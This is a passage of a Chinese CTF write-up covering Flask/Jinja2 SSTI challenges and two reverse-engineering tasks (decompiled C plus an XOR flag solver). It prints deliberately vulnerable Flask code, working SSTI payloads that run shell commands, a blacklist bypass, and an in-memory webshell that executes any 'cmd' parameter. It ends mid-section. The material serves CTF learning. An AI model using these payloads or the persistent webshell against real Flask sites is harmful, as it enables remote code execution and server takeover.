<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.args <span class="keyword">or</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        password = request.args.get(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            login_msg = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-fail&#x27;&gt;用户名或密码不能为空&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            login_msg = render_template_string(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-success&#x27;&gt;欢迎: <span class="subst">&#123;username&#125;</span>&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        login_msg = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, login_msg=login_msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>看出username处是个SSTI注入点，测试一下49，被执行，说明确实如此。</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250906175346.png" alt="20250906175346"></p>
<p><strong>payload:</strong><br><code>?username=&#123;%for(x)in().__class__.__base__.__subclasses__()%&#125;&#123;%if'war'in(x).__name__ %&#125;&#123;&#123;x()._module.__builtins__['__import__']('os').popen('cat /flag').read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;&amp;password=1</code></p>
<h3 id="21-第二十一章-往生漩涡·言灵死局"><a href="#21-第二十一章-往生漩涡·言灵死局" class="headerlink" title="21 第二十一章 往生漩涡·言灵死局"></a><strong>21 第二十一章 往生漩涡·言灵死局</strong></h3><p>考点：SSTI</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&quot;__&quot;</span>, <span class="string">&quot;global&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.args <span class="keyword">or</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        password = request.args.get(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            login_msg = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-fail&#x27;&gt;用户名或密码不能为空&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            login_msg = render_template_string(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-success&#x27;&gt;欢迎：<span class="subst">&#123;username&#125;</span>&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> blk <span class="keyword">in</span> blacklist:</span><br><span class="line">                <span class="keyword">if</span> blk <span class="keyword">in</span> username:</span><br><span class="line">                    login_msg = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;login-result&quot; id=&quot;result&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;result-title&quot;&gt;阵法反馈&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div id=&quot;result-content&quot;&gt;&lt;div class=&#x27;login-fail&#x27;&gt;Error&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        login_msg = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, login_msg=login_msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>


<p>是上一个题目的升级版，加了黑名单。<br>参考：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52635170/article/details/129836335">SSTI模板注入-中括号、args、下划线、单双引号、双大括号被过滤绕过（ctfshow web入门368）_ssti 过滤括号-CSDN博客</a></p>
<p>payload:<br><code>/?password=1&amp;username=&#123;%print (lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()%&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</code></p>
<h3 id="22-第二十二章：血海核心·千年手段"><a href="#22-第二十二章：血海核心·千年手段" class="headerlink" title="22 第二十二章：血海核心·千年手段"></a>22 第二十二章：血海核心·千年手段</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/shinnylbz/p/18572680">jinjia2无回显SSTI - colorfullbz - 博客园</a></p>
<p>直接内存马RCE:</p>
<p><code>&#123;&#123;url_for.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)",&#123;'request':url_for.__globals__['request'],'app':url_for.__globals__['sys'].modules['__main__'].__dict__['app']&#125;)&#125;&#125;</code></p>
<p>发现需要提权，尝试常见手法无果，本题没有做出来。</p>
<p>后来看了wp，发现出题人是魔改了rev命令，只有特定参数后的命令才会被执行。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i + <span class="number">1</span> &lt; argc; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;--HDdss&quot;</span>, argv[i]) == <span class="number">0</span>) &#123;</span><br><span class="line">            execvp(argv[i + <span class="number">1</span>], &amp;argv[i + <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rev --HDdss <span class="built_in">whoami</span>	<span class="comment">#root</span></span><br></pre></td></tr></table></figure>



<p>之后的两个反序列化有点抽象，之后好好看看。</p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="upx"><a href="#upx" class="headerlink" title="upx"></a><strong>upx</strong></h3><p>反编译伪c代码重点函数:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_1400118A0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v0; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  FILE *flag; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+20h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6[<span class="number">44</span>]; <span class="comment">// [rsp+30h] [rbp+10h]</span></span><br><span class="line">  <span class="type">char</span> Buffer[<span class="number">132</span>]; <span class="comment">// [rsp+E0h] [rbp+C0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> buffer_length; <span class="comment">// [rsp+164h] [rbp+144h]</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">60</span>]; <span class="comment">// [rsp+188h] [rbp+168h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1C4h] [rbp+1A4h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+1E4h] [rbp+1C4h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+204h] [rbp+1E4h]</span></span><br><span class="line"></span><br><span class="line">  v0 = &amp;v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">130</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *v0 = <span class="number">-858993460</span>;</span><br><span class="line">    v0 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140011375(&amp;unk_14002200E);</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">35</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="number">43</span>;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="number">39</span>;</span><br><span class="line">  v6[<span class="number">3</span>] = <span class="number">54</span>;</span><br><span class="line">  v6[<span class="number">4</span>] = <span class="number">51</span>;</span><br><span class="line">  v6[<span class="number">5</span>] = <span class="number">60</span>;</span><br><span class="line">  v6[<span class="number">6</span>] = <span class="number">3</span>;</span><br><span class="line">  v6[<span class="number">7</span>] = <span class="number">72</span>;</span><br><span class="line">  v6[<span class="number">8</span>] = <span class="number">100</span>;</span><br><span class="line">  v6[<span class="number">9</span>] = <span class="number">11</span>;</span><br><span class="line">  v6[<span class="number">10</span>] = <span class="number">29</span>;</span><br><span class="line">  v6[<span class="number">11</span>] = <span class="number">118</span>;</span><br><span class="line">  v6[<span class="number">12</span>] = <span class="number">123</span>;</span><br><span class="line">  v6[<span class="number">13</span>] = <span class="number">16</span>;</span><br><span class="line">  v6[<span class="number">14</span>] = <span class="number">11</span>;</span><br><span class="line">  v6[<span class="number">15</span>] = <span class="number">58</span>;</span><br><span class="line">  v6[<span class="number">16</span>] = <span class="number">63</span>;</span><br><span class="line">  v6[<span class="number">17</span>] = <span class="number">101</span>;</span><br><span class="line">  v6[<span class="number">18</span>] = <span class="number">118</span>;</span><br><span class="line">  v6[<span class="number">19</span>] = <span class="number">41</span>;</span><br><span class="line">  v6[<span class="number">20</span>] = <span class="number">21</span>;</span><br><span class="line">  v6[<span class="number">21</span>] = <span class="number">55</span>;</span><br><span class="line">  v6[<span class="number">22</span>] = <span class="number">28</span>;</span><br><span class="line">  v6[<span class="number">23</span>] = <span class="number">10</span>;</span><br><span class="line">  v6[<span class="number">24</span>] = <span class="number">8</span>;</span><br><span class="line">  v6[<span class="number">25</span>] = <span class="number">33</span>;</span><br><span class="line">  v6[<span class="number">26</span>] = <span class="number">62</span>;</span><br><span class="line">  v6[<span class="number">27</span>] = <span class="number">60</span>;</span><br><span class="line">  v6[<span class="number">28</span>] = <span class="number">61</span>;</span><br><span class="line">  v6[<span class="number">29</span>] = <span class="number">22</span>;</span><br><span class="line">  v6[<span class="number">30</span>] = <span class="number">11</span>;</span><br><span class="line">  v6[<span class="number">31</span>] = <span class="number">36</span>;</span><br><span class="line">  v6[<span class="number">32</span>] = <span class="number">41</span>;</span><br><span class="line">  v6[<span class="number">33</span>] = <span class="number">36</span>;</span><br><span class="line">  v6[<span class="number">34</span>] = <span class="number">86</span>;</span><br><span class="line">  sub_14001119F(<span class="string">&quot;please input your flag: &quot;</span>);</span><br><span class="line">  flag = _acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">  fgets(Buffer, <span class="number">100</span>, flag);                     <span class="comment">// Buffer: moectf&#123;***&#125;\0</span></span><br><span class="line">  buffer_length = j_strlen(Buffer);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; buffer_length; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = Buffer[j] ^ <span class="number">0x21</span>;</span><br><span class="line">    <span class="keyword">if</span> ( j &lt; buffer_length - <span class="number">1</span> )</span><br><span class="line">      v11 ^= Buffer[j + <span class="number">1</span>];</span><br><span class="line">    v9[j] = v11;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">35</span>; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v9[k] != v6[k] )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_14001119F(<span class="string">&quot;you will never get the flag!!!!\n&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140011311(v4, &amp;unk_14001AD00);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">secret = [<span class="number">35</span>, <span class="number">43</span>, <span class="number">39</span>, <span class="number">54</span>, <span class="number">51</span>, <span class="number">60</span>, <span class="number">3</span>, <span class="number">72</span>, <span class="number">100</span>, <span class="number">11</span>, <span class="number">29</span>, <span class="number">118</span>, <span class="number">123</span>, <span class="number">16</span>, <span class="number">11</span>, <span class="number">58</span>, <span class="number">63</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">41</span>, <span class="number">21</span>, <span class="number">55</span>, <span class="number">28</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">33</span>, <span class="number">62</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">36</span>, <span class="number">41</span>, <span class="number">36</span>, <span class="number">86</span>]</span><br><span class="line"><span class="built_in">print</span>(secret)</span><br><span class="line">flag = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(secret) - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(secret) - <span class="number">1</span>:</span><br><span class="line">      temp = secret[i] ^ flag[i + <span class="number">1</span>]</span><br><span class="line">      temp ^= <span class="number">0x21</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">       temp = secret[i] ^ <span class="number">0x21</span></span><br><span class="line">    flag[i] = temp</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(temp ^ <span class="number">10</span>) <span class="keyword">for</span> temp <span class="keyword">in</span> flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="ez3"><a href="#ez3" class="headerlink" title="ez3"></a><strong>ez3</strong></h3><p>反编译后伪c(已提高了可读性):</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// bl</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [rsp+Fh] [rbp-71h] BYREF</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+18h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">40</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+68h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input your flag:\n&gt; &quot;</span>, argv, envp);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string(input);</span><br><span class="line">  <span class="built_in">std</span>::operator&gt;&gt;&lt;<span class="type">char</span>&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, input);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">std</span>::<span class="built_in">string</span>::length(input) == <span class="number">42</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    v4 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)<span class="built_in">std</span>::<span class="built_in">string</span>::length(input) &gt; <span class="number">7</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::substr(v12, input, <span class="number">0LL</span>, <span class="number">7LL</span>);</span><br><span class="line">      v3 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="type">unsigned</span> __int8)<span class="built_in">std</span>::operator!=&lt;<span class="type">char</span>&gt;(v12, <span class="string">&quot;moectf&#123;&quot;</span>) &amp;&amp; *(_BYTE *)<span class="built_in">std</span>::<span class="built_in">string</span>::back(input) == <span class="number">125</span> )<span class="comment">// 截取flag头尾用于验证</span></span><br><span class="line">        v4 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v12);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;FORMAT ERROR!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(&amp;v8);</span><br><span class="line">      v10 = <span class="built_in">std</span>::<span class="built_in">string</span>::end(input);</span><br><span class="line">      v5 = __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,<span class="built_in">std</span>::<span class="built_in">string</span>&gt;::operator-(&amp;v10, <span class="number">1LL</span>);</span><br><span class="line">      v9 = <span class="built_in">std</span>::<span class="built_in">string</span>::begin(input);</span><br><span class="line">      v6 = __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,<span class="built_in">std</span>::<span class="built_in">string</span>&gt;::operator+(&amp;v9, <span class="number">7LL</span>);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string&lt;__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,<span class="built_in">std</span>::<span class="built_in">string</span>&gt;,<span class="type">void</span>&gt;(v12, v6, v5, &amp;v8);<span class="comment">// flag_head在此之后表示正文</span></span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::operator=(input, v12);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v12);</span><br><span class="line">      <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(&amp;v8);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string(v12, input);</span><br><span class="line">      LOBYTE(v5) = check(v12);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v12);</span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;But I don&#x27;t know what the true flag is&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;try again~&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Length error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(input);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>check函数:</p>
